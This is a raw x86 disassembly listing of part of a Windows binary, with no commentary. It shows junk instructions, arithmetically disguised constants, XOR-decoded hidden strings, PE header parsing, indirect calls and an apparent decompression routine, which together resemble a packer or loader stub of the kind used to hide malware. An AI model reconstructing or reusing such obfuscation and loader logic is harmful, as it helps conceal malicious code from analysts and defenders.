  424a95:	or     edx,DWORD PTR [esp+edx*2]
  424a98:	sbb    al,0xbc
  424a9a:	inc    eax
  424a9c:	xor    al,bh
  424a9e:	ret    
  424a9f:	inc    ebx
  424aa0:	mov    eax,ds:0xe9755a95
  424aa5:	sti    
  424aa6:	dec    edx
  424aa7:	sbb    eax,0x891c6a8e
  424aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424aad:	rcr    DWORD PTR [ecx],1
  424aaf:	dec    DWORD PTR [ecx]
  424ab1:	xchg   edx,eax
  424ab2:	loop   0x424aae
  424ab4:	in     eax,0x96
  424ab6:	(bad)  
  424ab7:	rcl    BYTE PTR [ebx],1
  424ab9:	dec    esp
  424aba:	and    al,0x76
  424abc:	mov    ebx,0xbad184a8
  424ac1:	frstor [eax]
  424ac3:	sub    eax,0x6489db2b
  424ac8:	xor    edi,ecx
  424aca:	in     al,dx
  424acb:	add    BYTE PTR [esi+0x41],al
  424ace:	xlat   BYTE PTR ds:[ebx]
  424acf:	mov    esp,0x489ab740
  424ad4:	mov    ch,0x1e
  424ad6:	shl    DWORD PTR [ecx+0x7c],1
  424ad9:	ins    BYTE PTR es:[edi],dx
  424ada:	inc    esp
  424adb:	mov    al,ds:0x232e5001
  424ae0:	add    al,0x81
  424ae2:	inc    ebx
  424ae3:	add    eax,0x332d762f
  424ae8:	addr16 (bad) 
  424aea:	loop   0x424a72
  424aec:	mov    dh,0x31
  424aee:	pop    ss
  424aef:	inc    edi
  424af0:	or     ecx,DWORD PTR [ebx]
  424af2:	dec    eax
  424af3:	or     BYTE PTR [ebx-0x7b],ch
  424af6:	out    dx,eax
  424af7:	push   0x48
  424af9:	(bad)  
  424afa:	push   ebx
  424afb:	adc    al,0x5e
  424afd:	mov    esp,0x138971cd
  424b02:	add    eax,0x1036b147
  424b07:	mov    BYTE PTR [ebx+0xf],dh
  424b0a:	cs pop ds
  424b0c:	call   0x1d531188
  424b11:	mov    bh,BYTE PTR [eax-0x1a8edf46]
  424b17:	fnsave [ebx]
  424b19:	push   ss
  424b1a:	dec    ecx
  424b1b:	data16 aad 0xcc
  424b1e:	dec    edi
  424b1f:	ins    DWORD PTR es:[edi],dx
  424b20:	js     0x424b25
  424b22:	dec    BYTE PTR [ebx-0x50f0f78b]
  424b28:	stc    
  424b29:	mov    ebx,DWORD PTR [ebp+0xc]
  424b2c:	xor    eax,edx
  424b2e:	add    eax,ecx
  424b30:	mov    al,BYTE PTR [ebx+eax*1+0x3272ef]
  424b37:	mov    BYTE PTR [edi+esi*1],al
  424b3a:	mov    eax,DWORD PTR [ebp-0x8]
  424b3d:	mov    esi,DWORD PTR [ebp+0x10]
  424b40:	xor    eax,edx
  424b42:	xor    ebx,ebx
  424b44:	add    esi,0xfabdbeda
  424b4a:	adc    ebx,0xffffffff
  424b4d:	lea    ecx,[ecx+eax*1+0x3272ef]
  424b54:	xor    edi,edi
  424b56:	xor    esi,0x8a29a13b
  424b5c:	xor    ebx,0x0
  424b5f:	mov    eax,ecx
  424b61:	add    eax,0xfabdbeda
  424b66:	adc    edi,0xffffffff
  424b69:	xor    eax,0x8a29a13b
  424b6e:	xor    edi,0x0
  424b71:	cmp    eax,esi
  424b73:	jne    0x423ca3
  424b79:	cmp    edi,ebx
  424b7b:	jne    0x423ca3
  424b81:	mov    eax,0xf89c85ba
  424b86:	pop    ebx
  424b87:	pop    edi
  424b88:	pop    esi
  424b89:	leave  
  424b8a:	ret    0xc
  424b8d:	push   ebp
  424b8e:	mov    ebp,esp
  424b90:	push   ecx
  424b91:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  424b98:	sbb    DWORD PTR ds:0x42a44a,edi
  424b9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ba1:	mov    DWORD PTR ds:0x42a3ba,0x17
  424bab:	cmp    DWORD PTR ds:0x42a3ba,0x0
  424bb2:	je     0x424bf4
  424bb8:	cmp    DWORD PTR ds:0x42a3ba,0x1a
  424bbf:	jge    0x424bf4
  424bc5:	jmp    0x424be2
  424bca:	push   0x81bf
  424bcf:	push   DWORD PTR [ebp-0x14]
  424bd2:	push   0x4ee6
  424bd7:	push   0x429247
  424bdc:	call   DWORD PTR ds:0x42a51a
  424be2:	mov    edx,DWORD PTR ds:0x42a3ba
  424be8:	dec    edx
  424be9:	mov    DWORD PTR ds:0x42a3ba,edx
  424bef:	jmp    0x424bab
  424bf4:	movsx  eax,BYTE PTR [eax]
  424bf7:	or     DWORD PTR ds:0x42a436,edi
  424bfd:	mov    edx,0x3272ef
  424c02:	mov    ecx,DWORD PTR ds:0x42a4de
  424c08:	mov    ecx,DWORD PTR [ecx]
  424c0a:	sub    DWORD PTR ds:0x42a446,ecx
  424c10:	sub    eax,edx
  424c12:	mov    ecx,0x75108a8
  424c17:	xor    eax,ecx
  424c19:	mov    DWORD PTR ds:0x42a402,0x47a6
  424c23:	cmp    eax,0xf89c85f6
  424c28:	jne    0x424c57
  424c2e:	mov    eax,DWORD PTR [ebp+0x8]
  424c31:	push   esi
  424c32:	mov    esi,DWORD PTR [ebp+0x8]
  424c35:	add    esi,DWORD PTR [eax+0x3c]
  424c38:	mov    DWORD PTR [ebp+0x8],esi
  424c3b:	mov    eax,DWORD PTR [ebp-0x4]
  424c3e:	mov    esi,DWORD PTR [ebp+0x8]
  424c41:	xor    eax,ecx
  424c43:	add    eax,edx
  424c45:	cmp    DWORD PTR [esi+0x54],eax
  424c48:	pop    esi
  424c49:	je     0x424c57
  424c4f:	mov    eax,DWORD PTR [ebp+0x8]
  424c52:	jmp    0x424c5e
  424c57:	mov    eax,DWORD PTR [ebp-0x4]
  424c5a:	xor    eax,ecx
  424c5c:	add    eax,edx
  424c5e:	leave  
  424c5f:	ret    0x4
  424c62:	push   ebp
  424c63:	mov    ebp,esp
  424c65:	sub    esp,0xc
  424c68:	or     DWORD PTR ds:0x42a452,0x1d31
  424c72:	push   esi
  424c73:	and    DWORD PTR ds:0x42a406,0x23eb
  424c7d:	mov    esi,0xf89c85b9
  424c82:	mov    DWORD PTR [ebp-0x8],esi
  424c85:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  424c8c:	mov    edx,DWORD PTR ds:0x42a3a6
  424c92:	or     DWORD PTR ds:0x42a3ca,edx
  424c98:	push   edi
  424c99:	mov    eax,eax
  424c9b:	mov    eax,DWORD PTR [ebp-0x4]
  424c9e:	mov    edi,DWORD PTR [ebp-0x8]
  424ca1:	and    DWORD PTR ds:0x42a3ba,ecx
  424ca7:	mov    ecx,0x75108a8
  424cac:	or     edx,0x44c8
  424cb2:	xor    eax,ecx
  424cb4:	xor    edi,ecx
  424cb6:	and    edx,DWORD PTR ds:0x42a42e
  424cbc:	mov    edx,0x3272ef
  424cc1:	sub    DWORD PTR ds:0x42a406,0x42a436
  424ccb:	add    edi,edx
  424ccd:	sbb    DWORD PTR ds:0x42a3b2,0x42a3f6
  424cd7:	add    eax,edx
  424cd9:	imul   eax,edi
  424cdc:	mov    DWORD PTR ds:0x42a452,0x2cc6
  424ce6:	mov    edi,DWORD PTR [ebp+0xc]
  424ce9:	mov    DWORD PTR ds:0x42a3b6,0x805
  424cf3:	cmp    edi,eax
  424cf5:	je     0x424dd5
  424cfb:	or     DWORD PTR ds:0x42a3d6,ebx
  424d01:	mov    DWORD PTR [ebp-0xc],esi
  424d04:	mov    eax,DWORD PTR [ebp-0xc]
  424d07:	mov    esi,DWORD PTR [ebp+0xc]
  424d0a:	xor    DWORD PTR ds:0x42a406,0x42a3f2
  424d14:	xor    eax,ecx
  424d16:	sbb    DWORD PTR ds:0x42a402,0x1fd5
  424d20:	lea    eax,[eax*8+0x19397f0]
  424d27:	mov    DWORD PTR ds:0x42a3ce,0x647a
  424d31:	mov    eax,DWORD PTR [esi+eax*1]
  424d34:	and    DWORD PTR ds:0x42a43a,0x0
  424d3e:	jmp    0x424d52
  424d43:	xor    esi,esi
  424d45:	xor    esi,DWORD PTR ds:0x42a43a
  424d4b:	inc    esi
  424d4c:	mov    DWORD PTR ds:0x42a43a,esi
  424d52:	cmp    DWORD PTR ds:0x42a43a,0x17
  424d59:	jae    0x424d9b
  424d5f:	cmp    DWORD PTR ds:0x42a43a,0x20
  424d66:	jl     0x424d9b
  424d6c:	jmp    0x424d96
  424d71:	push   0x42a406
  424d76:	push   0x60aa
  424d7b:	push   0x629f
  424d80:	push   DWORD PTR [ebp-0x24]
  424d83:	push   0x2e64
  424d88:	push   0x223e
  424d8d:	push   DWORD PTR [ebp-0x20]
  424d90:	call   DWORD PTR ds:0x42a51e
  424d96:	jmp    0x424d43
  424d9b:	mov    DWORD PTR [ebp+0xc],eax
  424d9e:	mov    eax,DWORD PTR [ebp-0x4]
  424da1:	mov    esi,DWORD PTR [ebp-0x8]
  424da4:	xor    eax,ecx
  424da6:	xor    esi,ecx
  424da8:	add    esi,edx
  424daa:	add    eax,edx
  424dac:	imul   eax,esi
  424daf:	mov    esi,DWORD PTR [ebp+0xc]
  424db2:	cmp    esi,eax
  424db4:	je     0x424dd5
  424dba:	mov    eax,DWORD PTR [ebp-0x4]
  424dbd:	xor    eax,ecx
  424dbf:	mov    ecx,DWORD PTR [ebp+0xc]
  424dc2:	add    eax,edx
  424dc4:	imul   eax,ecx
  424dc7:	add    eax,DWORD PTR [ebp+0x8]
  424dca:	mov    DWORD PTR [ebp+0xc],eax
  424dcd:	mov    eax,DWORD PTR [ebp+0xc]
  424dd0:	jmp    0x424de6
  424dd5:	mov    eax,DWORD PTR [ebp-0x4]
  424dd8:	mov    esi,DWORD PTR [ebp-0x8]
  424ddb:	xor    esi,ecx
  424ddd:	xor    eax,ecx
  424ddf:	add    esi,edx
  424de1:	add    eax,edx
  424de3:	imul   eax,esi
  424de6:	pop    edi
  424de7:	pop    esi
  424de8:	leave  
  424de9:	ret    0x8
	...
  424df4:	outs   dx,BYTE PTR ds:[esi]
  424df5:	sti    
  424df6:	ss dec ebp
  424df8:	add    BYTE PTR [eax],al
  424dfa:	add    BYTE PTR [eax],al
  424dfc:	add    al,BYTE PTR [eax]
  424dfe:	add    BYTE PTR [eax],al
  424e00:	xor    al,0x0
  424e02:	add    BYTE PTR [eax],al
  424e04:	adc    BYTE PTR [esi+0x2],cl
  424e07:	add    BYTE PTR [eax],dl
  424e09:	inc    edx
  424e0a:	add    al,BYTE PTR [eax]
  424e0c:	add    BYTE PTR [eax],al
  424e0e:	add    BYTE PTR [eax],al
  424e10:	push   edx
  424e11:	push   ebx
  424e12:	inc    esp
  424e13:	push   ebx
  424e14:	add    eax,0x31322ef6
  424e19:	sbb    al,0xa9
  424e1b:	dec    esi
  424e1c:	call   0xe668:0x7a5e3d4b
  424e23:	bound  eax,QWORD PTR [ecx]
  424e25:	add    BYTE PTR [eax],al
  424e27:	add    BYTE PTR [ebp+0x3a],al
  424e2a:	pop    esp
  424e2b:	push   edx
  424e2c:	popa   
  424e2d:	ja     0x424e4f
  424e2f:	inc    esp
  424e30:	popa   
  424e31:	je     0x424e94
  424e33:	pop    esp
  424e34:	inc    ebp
  424e35:	outs   dx,BYTE PTR ds:[esi]
  424e36:	arpl   WORD PTR [edi+0x64],bp
  424e39:	gs fs inc esp
  424e3c:	popa   
  424e3d:	je     0x424ea0
  424e3f:	inc    esi
  424e40:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x81ec558b
  424e48:	in     al,dx
  424e49:	or     BYTE PTR [ecx],al
  424e4b:	add    BYTE PTR [eax],al
  424e4d:	push   ebx
  424e4e:	mov    eax,ebx
  424e50:	xchg   ecx,eax
  424e51:	mov    eax,DWORD PTR [ebp+0x8]
  424e54:	cmp    eax,0xf89c85b9
  424e59:	jne    0x42531b
  424e5f:	mov    eax,DWORD PTR [ebp+0xc]
  424e62:	cmp    eax,0xf89c85ba
  424e67:	jne    0x42531b
  424e6d:	mov    eax,DWORD PTR [ebp+0x24]
  424e70:	mov    DWORD PTR [ebp-0x4],eax
  424e73:	mov    eax,DWORD PTR [ebp-0x4]
  424e76:	mov    eax,DWORD PTR [eax+0x1d8]
  424e7c:	mov    eax,DWORD PTR [eax]
  424e7e:	mov    eax,DWORD PTR [eax]
  424e80:	mov    DWORD PTR [ebp-0x8],eax
  424e83:	mov    BYTE PTR [ebp-0x18],0x13
  424e87:	mov    BYTE PTR [ebp-0x17],0x1e
  424e8b:	mov    BYTE PTR [ebp-0x16],0x11
  424e8f:	mov    BYTE PTR [ebp-0x15],0x4f
  424e93:	mov    BYTE PTR [ebp-0x14],0x48
  424e97:	mov    BYTE PTR [ebp-0x13],0x7a
  424e9b:	mov    BYTE PTR [ebp-0x20],0xd
  424e9f:	mov    BYTE PTR [ebp-0x1f],0xf
  424ea3:	mov    BYTE PTR [ebp-0x1e],0x1d
  424ea7:	mov    BYTE PTR [ebp-0x1d],0x8
  424eab:	mov    BYTE PTR [ebp-0x1c],0x4f
  424eaf:	mov    BYTE PTR [ebp-0x1b],0x48
  424eb3:	mov    BYTE PTR [ebp-0x1a],0x7a
  424eb7:	mov    BYTE PTR [ebp-0x28],0xf
  424ebb:	mov    BYTE PTR [ebp-0x27],0x12
  424ebf:	mov    BYTE PTR [ebp-0x26],0x16
  424ec3:	mov    BYTE PTR [ebp-0x25],0x3
  424ec7:	mov    BYTE PTR [ebp-0x24],0x19
  424ecb:	push   esi
  424ecc:	mov    BYTE PTR [ebp-0x23],0xa
  424ed0:	mov    BYTE PTR [ebp-0x22],0x11
  424ed4:	push   edi
  424ed5:	mov    BYTE PTR [ebp-0x21],0x7a
  424ed9:	xor    esi,esi
  424edb:	mov    eax,0xff
  424ee0:	lea    ecx,[ebp+esi*1-0x18]
  424ee4:	movzx  edx,BYTE PTR [ecx]
  424ee7:	xor    edx,0x7b
  424eea:	add    edx,eax
  424eec:	inc    esi
  424eed:	mov    BYTE PTR [ecx],dl
  424eef:	cmp    esi,0x6
  424ef2:	jb     0x424ee0
  424ef4:	xor    esi,esi
  424ef6:	lea    ecx,[ebp+esi*1-0x20]
  424efa:	movzx  edx,BYTE PTR [ecx]
  424efd:	xor    edx,0x7b
  424f00:	add    edx,eax
  424f02:	inc    esi
  424f03:	mov    BYTE PTR [ecx],dl
  424f05:	cmp    esi,0x7
  424f08:	jb     0x424ef6
  424f0a:	xor    esi,esi
  424f0c:	lea    ecx,[ebp+esi*1-0x28]
  424f10:	movzx  edx,BYTE PTR [ecx]
  424f13:	xor    edx,0x7b
  424f16:	add    edx,eax
  424f18:	inc    esi
  424f19:	mov    BYTE PTR [ecx],dl
  424f1b:	cmp    esi,0x8
  424f1e:	jb     0x424f0c
  424f20:	lea    eax,[ebp-0x2c]
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    ecx,DWORD PTR [ebp-0x8]
  424f29:	mov    eax,0x7113fccf
  424f2e:	mov    DWORD PTR [ecx],eax
  424f30:	mov    ecx,DWORD PTR [ebp-0x2c]
  424f33:	mov    esi,0x4e31
  424f38:	mov    ebx,0x3272ef
  424f3d:	cmp    ecx,eax
  424f3f:	jne    0x42500a
  424f45:	lea    eax,[esi+0x35]
  424f48:	mov    WORD PTR [ebp-0x78],ax
  424f4c:	mov    eax,esi
  424f4e:	mov    WORD PTR [ebp-0x76],ax
  424f52:	add    eax,0x4b
  424f55:	mov    WORD PTR [ebp-0x74],ax
  424f59:	lea    eax,[esi+0xe]
  424f5c:	mov    WORD PTR [ebp-0x72],ax
  424f60:	add    eax,0x3f
  424f63:	mov    ecx,eax
  424f65:	lea    eax,[esi-0xd]
  424f68:	mov    WORD PTR [ebp-0x66],ax
  424f6c:	mov    eax,esi
  424f6e:	mov    WORD PTR [ebp-0x64],ax
  424f72:	add    eax,0xfffffff4
  424f75:	mov    WORD PTR [ebp-0x62],ax
  424f79:	mov    eax,0x44a
  424f7e:	mov    WORD PTR [ebp-0x60],ax
  424f82:	mov    eax,0x567b
  424f87:	mov    WORD PTR [ebp-0x5e],ax
  424f8b:	mov    eax,0x611b
  424f90:	mov    WORD PTR [ebp-0x5c],ax
  424f94:	lea    eax,[ebp-0xe0]
  424f9a:	push   eax
  424f9b:	mov    eax,DWORD PTR [ebp+0xc]
  424f9e:	mov    edi,0x75108a8
  424fa3:	xor    eax,edi
  424fa5:	add    eax,ebx
  424fa7:	push   eax
  424fa8:	mov    WORD PTR [ebp-0x70],cx
  424fac:	lea    ecx,[esi+0xa]
  424faf:	mov    edx,ecx
  424fb1:	lea    eax,[ebp-0x78]
  424fb4:	push   eax
  424fb5:	mov    eax,DWORD PTR [ebp-0x4]
  424fb8:	mov    eax,DWORD PTR [eax+0x198]
  424fbe:	mov    WORD PTR [ebp-0x6e],dx
  424fc2:	mov    edx,0x4f85
  424fc7:	mov    WORD PTR [ebp-0x6c],dx
  424fcb:	mov    DWORD PTR [ebp-0x6a],0x4e7e4e38
  424fd2:	mov    DWORD PTR [ebp-0x5a],0x4e3bf1e9
  424fd9:	mov    DWORD PTR [ebp-0xe0],0x1
  424fe3:	mov    DWORD PTR [ebp-0xdc],0x255
  424fed:	push   DWORD PTR [eax]
  424fef:	mov    eax,DWORD PTR [ebp+0x10]
  424ff2:	call   eax
  424ff4:	mov    DWORD PTR [ebp-0x8],eax
  424ff7:	mov    eax,DWORD PTR [ebp-0x8]
  424ffa:	test   eax,eax
  424ffc:	je     0x42500f
  424ffe:	xor    DWORD PTR ds:0x76586876,0x87687666
  425008:	jmp    0x42500f
  42500a:	mov    edi,0x75108a8
  42500f:	mov    eax,DWORD PTR [ebp-0x4]
  425012:	mov    ecx,DWORD PTR [eax+0x18c]
  425018:	xor    eax,eax
  42501a:	cmp    DWORD PTR [ecx],eax
  42501c:	jne    0x42528e
  425022:	mov    ecx,DWORD PTR [ebp-0x4]
  425025:	mov    ecx,DWORD PTR [ecx+0x17c]
  42502b:	mov    DWORD PTR [ecx],eax
  42502d:	mov    ecx,DWORD PTR [ebp-0x4]
  425030:	mov    ecx,DWORD PTR [ecx+0x180]
  425036:	mov    DWORD PTR [ecx],eax
  425038:	mov    eax,0x4e6c
  42503d:	mov    WORD PTR [ebp-0x9c],ax
  425044:	mov    eax,esi
  425046:	mov    WORD PTR [ebp-0x9a],ax
  42504d:	mov    eax,0x4e7c
  425052:	mov    WORD PTR [ebp-0x98],ax
  425059:	add    eax,0xffffffc0
  42505c:	mov    WORD PTR [ebp-0x96],ax
  425063:	mov    eax,0x4f81
  425068:	mov    WORD PTR [ebp-0x94],ax
  42506f:	mov    eax,0x4e3d
  425074:	mov    WORD PTR [ebp-0x92],ax
  42507b:	add    eax,0x41
  42507e:	mov    WORD PTR [ebp-0x90],ax
  425085:	mov    eax,0x4e3b
  42508a:	mov    WORD PTR [ebp-0x8e],ax
  425091:	mov    eax,esi
  425093:	mov    WORD PTR [ebp-0x8c],ax
  42509a:	mov    eax,0x4e38
  42509f:	mov    WORD PTR [ebp-0x8a],ax
  4250a6:	mov    eax,0x99fc
  4250ab:	mov    WORD PTR [ebp-0x88],ax
  4250b2:	mov    eax,0x8d6d
  4250b7:	mov    WORD PTR [ebp-0x86],ax
  4250be:	mov    eax,0xd66e
  4250c3:	mov    WORD PTR [ebp-0x84],ax
  4250ca:	mov    eax,0xd78a
  4250cf:	mov    WORD PTR [ebp-0x82],ax
  4250d6:	mov    eax,0x278b
  4250db:	mov    WORD PTR [ebp-0x80],ax
  4250df:	mov    eax,0x478b
  4250e4:	mov    WORD PTR [ebp-0x7e],ax
  4250e8:	mov    eax,0x4e3a
  4250ed:	push   0x8
  4250ef:	mov    WORD PTR [ebp-0x7c],ax
  4250f3:	mov    DWORD PTR [ebp-0x10],0x316120f
  4250fa:	mov    DWORD PTR [ebp-0xc],0x7a110a19
  425101:	lea    eax,[ebp-0x10]
  425104:	pop    ecx
  425105:	mov    dl,BYTE PTR [eax]
  425107:	xor    dl,0x7b
  42510a:	dec    dl
  42510c:	mov    BYTE PTR [eax],dl
  42510e:	inc    eax
  42510f:	dec    ecx
  425110:	jne    0x425105
  425112:	lea    eax,[ebp-0x10]
  425115:	mov    DWORD PTR [ebp-0xdc],eax
  42511b:	lea    eax,[ebp-0xe0]
  425121:	push   eax
  425122:	mov    eax,DWORD PTR [ebp+0xc]
  425125:	xor    eax,edi
  425127:	add    eax,ebx
  425129:	push   eax
  42512a:	mov    eax,DWORD PTR [ebp-0x4]
  42512d:	add    eax,0x66
  425130:	push   eax
  425131:	mov    eax,DWORD PTR [ebp-0x4]
  425134:	mov    eax,DWORD PTR [eax+0x198]
  42513a:	mov    DWORD PTR [ebp-0xe0],0x1
  425144:	push   DWORD PTR [eax]
  425146:	mov    eax,DWORD PTR [ebp+0x10]
  425149:	call   eax
  42514b:	mov    ecx,DWORD PTR [ebp+0x8]
  42514e:	xor    ecx,edi
  425150:	add    ecx,ebx
  425152:	mov    DWORD PTR [ebp-0x8],eax
  425155:	cmp    eax,ecx
  425157:	jne    0x425172
  425159:	mov    eax,ds:0x33730bc0
  42515e:	or     eax,0x22150bcf
  425163:	mov    ds:0x33730bc0,eax
  425168:	add    eax,0x3372e92f
  42516d:	mov    ds:0x33730bc0,eax
  425172:	mov    ecx,0x4e69
  425177:	mov    eax,ecx
  425179:	mov    WORD PTR [ebp-0x40],ax
  42517d:	add    eax,0xfffffff9
  425180:	mov    edx,eax
  425182:	mov    WORD PTR [ebp-0x3e],dx
  425186:	mov    edx,0x4f9a
  42518b:	mov    WORD PTR [ebp-0x3c],dx
  42518f:	add    edx,0xffffffe8
  425192:	mov    WORD PTR [ebp-0x3a],dx
  425196:	mov    edx,0x4f80
  42519b:	mov    WORD PTR [ebp-0x38],dx
  42519f:	add    edx,0xf
  4251a2:	mov    WORD PTR [ebp-0x36],dx
  4251a6:	mov    edx,0x4fb6
  4251ab:	mov    WORD PTR [ebp-0x34],dx
  4251af:	mov    WORD PTR [ebp-0x32],cx
  4251b3:	mov    ecx,esi
  4251b5:	mov    WORD PTR [ebp-0x30],cx
  4251b9:	lea    ecx,[edx-0x2d]
  4251bc:	mov    edx,ecx
  4251be:	mov    WORD PTR [ebp-0x54],dx
  4251c2:	mov    edx,eax
  4251c4:	mov    WORD PTR [ebp-0x52],dx
  4251c8:	mov    edx,0x4e7a
  4251cd:	mov    WORD PTR [ebp-0x50],dx
  4251d1:	mov    WORD PTR [ebp-0x4e],ax
  4251d5:	lea    eax,[edx-0x1a]
  4251d8:	mov    WORD PTR [ebp-0x4c],ax
  4251dc:	add    eax,0xf
  4251df:	mov    WORD PTR [ebp-0x4a],ax
  4251e3:	lea    eax,[ecx+0xd]
  4251e6:	mov    WORD PTR [ebp-0x48],ax
  4251ea:	mov    WORD PTR [ebp-0x46],cx
  4251ee:	mov    WORD PTR [ebp-0x44],si
  4251f2:	mov    eax,DWORD PTR [ebp+0x8]
  4251f5:	movzx  ecx,WORD PTR [ebp-0x54]
  4251f9:	xor    eax,edi
  4251fb:	add    eax,ebx
  4251fd:	xor    eax,ecx
  4251ff:	mov    WORD PTR [ebp-0x54],ax
  425203:	mov    eax,DWORD PTR [ebp+0x8]
  425206:	movzx  ecx,WORD PTR [ebp-0x40]
  42520a:	xor    eax,edi
  42520c:	add    eax,ebx
  42520e:	xor    eax,ecx
  425210:	mov    WORD PTR [ebp-0x40],ax
  425214:	xor    eax,eax
  425216:	mov    WORD PTR [ebp-0xf4],ax
  42521d:	mov    WORD PTR [ebp-0x108],ax
  425224:	mov    edi,DWORD PTR [ebp+0x24]
  425227:	lea    eax,[ebp-0xf4]
  42522d:	lea    edx,[ebp-0x54]
  425230:	mov    DWORD PTR [ebp-0xe0],0x2
  42523a:	mov    DWORD PTR [ebp-0xdc],eax
  425240:	call   0x427c77
  425245:	mov    DWORD PTR [ebp-0xd8],eax
  42524b:	lea    eax,[ebp-0xe0]
  425251:	push   eax
  425252:	mov    eax,DWORD PTR [ebp+0xc]
  425255:	xor    eax,0x75108a8
  42525a:	add    eax,ebx
  42525c:	push   eax
  42525d:	lea    eax,[ebp-0x9c]
  425263:	push   eax
  425264:	push   DWORD PTR [ebp-0x8]
  425267:	mov    eax,DWORD PTR [ebp+0x10]
  42526a:	call   eax
  42526c:	mov    edi,DWORD PTR [ebp+0x24]
  42526f:	lea    eax,[ebp-0x108]
  425275:	lea    edx,[ebp-0x40]
  425278:	mov    DWORD PTR [ebp-0xdc],eax
  42527e:	call   0x427c77
  425283:	mov    DWORD PTR [ebp-0xd8],eax
  425289:	mov    edi,0x75108a8
  42528e:	mov    eax,DWORD PTR [ebp+0x14]
  425291:	push   DWORD PTR [ebp-0x4]
  425294:	push   DWORD PTR [ebp+0x20]
  425297:	push   DWORD PTR [ebp+0x1c]
  42529a:	push   DWORD PTR [ebp+0x18]
  42529d:	push   DWORD PTR [ebp+0x10]
  4252a0:	push   DWORD PTR [ebp+0x8]
  4252a3:	push   DWORD PTR [ebp+0xc]
  4252a6:	call   0x426518
  4252ab:	test   eax,eax
  4252ad:	je     0x4252f1
  4252af:	add    DWORD PTR [ebp-0x4],eax
  4252b2:	push   DWORD PTR [ebp-0x4]
  4252b5:	lea    esi,[ebp+0x4]
  4252b8:	call   0x425709
  4252bd:	mov    eax,DWORD PTR [ebp-0x4]
  4252c0:	mov    eax,DWORD PTR [eax+0x1c8]
  4252c6:	mov    eax,DWORD PTR [eax]
  4252c8:	xor    eax,edi
  4252ca:	add    eax,ebx
  4252cc:	mov    eax,DWORD PTR [ebp-0x4]
  4252cf:	jne    0x4252e7
  4252d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4252d4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4252da:	push   DWORD PTR [ecx]
  4252dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e2:	call   DWORD PTR [eax+0x28]
  4252e5:	jmp    0x4252f1
  4252e7:	mov    eax,DWORD PTR [eax+0x17c]
  4252ed:	mov    eax,DWORD PTR [eax]
  4252ef:	add    DWORD PTR [esi],eax
  4252f1:	mov    eax,DWORD PTR [ebp-0x4]
  4252f4:	mov    eax,DWORD PTR [eax+0x1dc]
  4252fa:	dec    DWORD PTR [eax]
  4252fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252ff:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425305:	mov    eax,DWORD PTR [eax]
  425307:	lea    eax,[ecx+eax*4]
  42530a:	mov    ecx,DWORD PTR [ebp-0x4]
  42530d:	mov    ecx,DWORD PTR [ecx+0x17c]
  425313:	mov    eax,DWORD PTR [eax]
  425315:	mov    ecx,DWORD PTR [ecx]
  425317:	add    DWORD PTR [eax],ecx
  425319:	pop    edi
  42531a:	pop    esi
  42531b:	pop    ebx
  42531c:	leave  
  42531d:	ret    0x20
  425320:	push   edi
  425321:	push   esi
  425322:	push   ebx
  425323:	push   ebp
  425324:	mov    ebp,esp
  425326:	mov    eax,DWORD PTR [ebp+0x24]
  425329:	add    DWORD PTR [ebp+0x28],eax
  42532c:	push   eax
  42532d:	cld    
  42532e:	mov    esi,DWORD PTR [ebp+0x18]
  425331:	add    DWORD PTR [ebp+0x1c],esi
  425334:	push   esi
  425335:	mov    esi,DWORD PTR [ebp+0x14]
  425338:	lods   eax,DWORD PTR ds:[esi]
  425339:	xchg   edx,eax
  42533a:	push   edx
  42533b:	mov    cl,BYTE PTR [esi-0x2]
  42533e:	or     eax,0xffffffff
  425341:	shl    eax,cl
  425343:	not    eax
  425345:	push   eax
  425346:	mov    cl,dh
  425348:	or     eax,0xffffffff
  42534b:	shl    eax,cl
  42534d:	not    eax
  42534f:	push   eax
  425350:	add    cl,dl
  425352:	mov    edi,esi
  425354:	sub    esp,0xc
  425357:	sub    eax,eax
  425359:	inc    eax
  42535a:	push   eax
  42535b:	push   eax
  42535c:	push   eax
  42535d:	push   eax
  42535e:	push   eax
  42535f:	push   edi
  425360:	sub    esi,esi
  425362:	push   esi
  425363:	or     ebx,0xffffffff
  425366:	mov    eax,0x300
  42536b:	shl    eax,cl
  42536d:	lea    ecx,[eax+0x736]
  425373:	mov    eax,0x4000400
  425378:	shr    ecx,1
  42537a:	rep stos DWORD PTR es:[edi],eax
  42537c:	push   0x5
  42537e:	pop    ecx
  42537f:	call   0x42566a
  425384:	loop   0x42537f
  425386:	lea    esi,[esi]
  425388:	lea    edi,[edi]
  42538a:	mov    edi,DWORD PTR [ebp-0x4]
  42538d:	mov    eax,DWORD PTR [ebp-0x10]
  425390:	sub    edi,DWORD PTR [ebp+0x24]
  425393:	and    eax,edi
  425395:	mov    DWORD PTR [ebp-0x18],eax
  425398:	mov    al,0x0
  42539a:	call   0x425682
  42539f:	jne    0x42543a
  4253a5:	mov    cl,BYTE PTR [ebp-0xc]
  4253a8:	and    edi,DWORD PTR [ebp-0x14]
  4253ab:	shl    edi,cl
  4253ad:	sub    cl,0x8
  4253b0:	neg    cl
  4253b2:	shr    esi,cl
  4253b4:	pop    eax
  4253b5:	add    edi,esi
  4253b7:	pop    esi
  4253b8:	lea    edi,[edi+edi*2]
  4253bb:	shl    edi,0x8
  4253be:	cmp    al,0x7
  4253c0:	pop    edx
  4253c1:	lea    ecx,[esi+edi*2+0xe6c]
  4253c8:	push   ecx
  4253c9:	push   esi
  4253ca:	mov    esi,0x100
  4253cf:	push   eax
  4253d0:	mov    al,0x1
  4253d2:	jb     0x425408
  4253d4:	mov    edi,DWORD PTR [ebp-0x4]
  4253d7:	sub    edi,DWORD PTR [ebp-0x24]
  4253da:	movzx  edi,BYTE PTR [edi]
  4253dd:	mov    ebp,DWORD PTR [ebp-0x34]
  4253e0:	shl    edi,1
  4253e2:	mov    ecx,esi
  4253e4:	and    esi,edi
  4253e6:	add    ecx,esi
  4253e8:	lea    ebp,[ebp+ecx*2+0x0]
  4253ec:	call   0x4256a1
  4253f1:	mov    ecx,eax
  4253f3:	shr    esi,0x8
